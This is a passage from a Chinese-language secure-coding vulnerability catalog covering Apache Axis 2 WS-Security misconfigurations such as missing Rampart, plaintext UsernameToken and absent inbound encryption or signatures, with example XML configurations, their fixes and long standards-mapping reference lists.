<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3860 CAT II, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3860 CAT II, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3860 CAT II, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3860 CAT II, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3860 CAT II, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3860 CAT II, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[24] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Provider-Misconfiguration-WS-Security-Not-Enabled"><a href="#Axis-2-Service-Provider-Misconfiguration-WS-Security-Not-Enabled" class="headerlink" title="Axis 2 Service Provider Misconfiguration: WS-Security Not Enabled"></a>Axis 2 Service Provider Misconfiguration: WS-Security Not Enabled</h4><h5 id="ABSTRACT-154"><a href="#ABSTRACT-154" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>关闭 WS-Security 难以保证消息完整性和保密性。</p>
<h5 id="EXPLANATION-155"><a href="#EXPLANATION-155" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>未启用 Rampart WS-Security 模块。WS-Security 是 SOAP 的扩展功能，无论采用何种传输协议，它都能提供端到端的消息完整性和保密性。不使用 WS-Security 时，将依靠传输安全性来保证消息的完整性和保密性。如果一项服务将消息转发到其他服务，则会使用中继点之间最薄弱的传输机制传送消息。WS-Security 可移除传输安全性 dependency，并将安全性内置到消息中。</p>
<h5 id="RECOMMENDATIONS-154"><a href="#RECOMMENDATIONS-154" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将该服务配置为使用 Rampart WS-Security 模块。在服务提供程序配置文件中添加<code>&lt;module ref=“rampart”/&gt;</code>，便可启用此模块。</p>
<h5 id="REFERENCES-153"><a href="#REFERENCES-153" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[3] Standards Mapping - FIPS200 CM, SC</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260.1 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Provider-Misconfiguration-Weak-Token"><a href="#Axis-2-Service-Provider-Misconfiguration-Weak-Token" class="headerlink" title="Axis 2 Service Provider Misconfiguration: Weak Token"></a>Axis 2 Service Provider Misconfiguration: Weak Token</h4><h5 id="ABSTRACT-155"><a href="#ABSTRACT-155" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若在未经加密的通道上使用 UsernameToken 及明文密码，则可截取 SOAP 消息的攻击者会趁机获取该密码。</p>
<h5 id="EXPLANATION-156"><a href="#EXPLANATION-156" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用 UsernameToken 的服务提供程序可能会接受以明文形式发送的密码。若通过未经加密的通道发送明文密码，则可截取 SOAP 消息的攻击者会趁机获取凭证。</p>
<p>下列 Axis 2 服务提供程序配置使用了 UsernameToken：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;action&gt;</span><br><span class="line"></span><br><span class="line">        &lt;items&gt;UsernameToken&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-155"><a href="#RECOMMENDATIONS-155" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>要求使用签名，而不是 UsernameToken。下面提供了一个配置示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;action&gt;</span><br><span class="line"></span><br><span class="line">        &lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-154"><a href="#REFERENCES-154" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Web Services Security: SOAP Message Security 1.1 OASIS</p>
<p>[3] Web Services Security Username Token Profile 1.0 OASIS</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[5] Standards Mapping - FIPS200 CM</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage</p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage</p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.8, Requirement 8.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.3, Requirement 8.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[18] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260.1 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[30] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Requester-Misconfiguration-Inbound-WS-Security-Not-Enabled"><a href="#Axis-2-Service-Requester-Misconfiguration-Inbound-WS-Security-Not-Enabled" class="headerlink" title="Axis 2 Service Requester Misconfiguration: Inbound WS-Security Not Enabled"></a>Axis 2 Service Requester Misconfiguration: Inbound WS-Security Not Enabled</h4><h5 id="ABSTRACT-156"><a href="#ABSTRACT-156" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若服务提供程序不使用 WS-Security，则难以保证消息的完整性或保密性。</p>
<h5 id="EXPLANATION-157"><a href="#EXPLANATION-157" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>WS-Security 是 SOAP 的扩展功能，无论采用何种传输协议，它都能提供端到端的消息完整性和保密性。不使用 WS-Security 时，将依靠传输安全性来保证消息的完整性和保密性。如果一项服务将消息转发到其他服务，则会使用中继点之间最薄弱的传输机制传送消息。WS-Security 可移除传输安全性 dependency，并将安全性内置到消息中。</p>
<p>若 Apache Axis 2 配置文件中缺少 InflowSecurity 参数，则表明未启用输入消息的安全性。</p>
<h5 id="RECOMMENDATIONS-156"><a href="#RECOMMENDATIONS-156" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果服务提供程序提供支持，则将客户端配置为对输入的响应使用 WS-Security。</p>
<p>此配置应包含 InflowSecurity 参数，如下例所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-155"><a href="#REFERENCES-155" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260.1 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Requester-Misconfiguration-Missing-Inbound-Encryption"><a href="#Axis-2-Service-Requester-Misconfiguration-Missing-Inbound-Encryption" class="headerlink" title="Axis 2 Service Requester Misconfiguration: Missing Inbound Encryption"></a>Axis 2 Service Requester Misconfiguration: Missing Inbound Encryption</h4><h5 id="ABSTRACT-157"><a href="#ABSTRACT-157" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未加密的消息无法保护其保密性。</p>
<h5 id="EXPLANATION-158"><a href="#EXPLANATION-158" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>SOAP 消息级加密可确保真正的端到端保密性。可通过多种传输协议发送 SOAP 消息，例如 HTTPS、HTTP、TCP、SMTP、UDP 等。无论采用哪种传输协议，消息级加密都可确保消息的保密性。Web 服务之间的常见传送情形是在各种服务之间转发 SOAP 消息，因此通过消息级加密，消息发送者和接收者均无需担忧中继点之间的传输安全问题。</p>
<p>下列 Apache Axis 2 Rampart 客户端配置不要求对输入的消息进行加密，因为 <code>&lt;items&gt;</code> 标签不包含 Encrypt 指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Signature&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-157"><a href="#RECOMMENDATIONS-157" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将您的客户端配置为只接受加密的消息。在 <code>&lt;items&gt;</code>标签中添加 Encrypt 指令，便可完成此配置。</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<p>顺序非常重要！将 Encrypt 指令放在末尾，可确保其前面的任何内容都得到加密。在上例中，时间戳和签名都将被加密。</p>
<h5 id="REFERENCES-156"><a href="#REFERENCES-156" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Requester-Misconfiguration-Missing-Inbound-Signature"><a href="#Axis-2-Service-Requester-Misconfiguration-Missing-Inbound-Signature" class="headerlink" title="Axis 2 Service Requester Misconfiguration: Missing Inbound Signature"></a>Axis 2 Service Requester Misconfiguration: Missing Inbound Signature</h4><h5 id="ABSTRACT-158"><a href="#ABSTRACT-158" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>缺少签名意味着无法保证 SOAP 消息的完整性。</p>
<h5 id="EXPLANATION-159"><a href="#EXPLANATION-159" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>消息中任何未经签名的部分，都可能在发送者或接收者未察觉的情况下被截取和修改。没有签名，接收者就无法借助密码来验证消息内容来自真正的发送者。</p>
<p>下列客户端配置可让 Axis 2 接受未经签名的消息：</p>
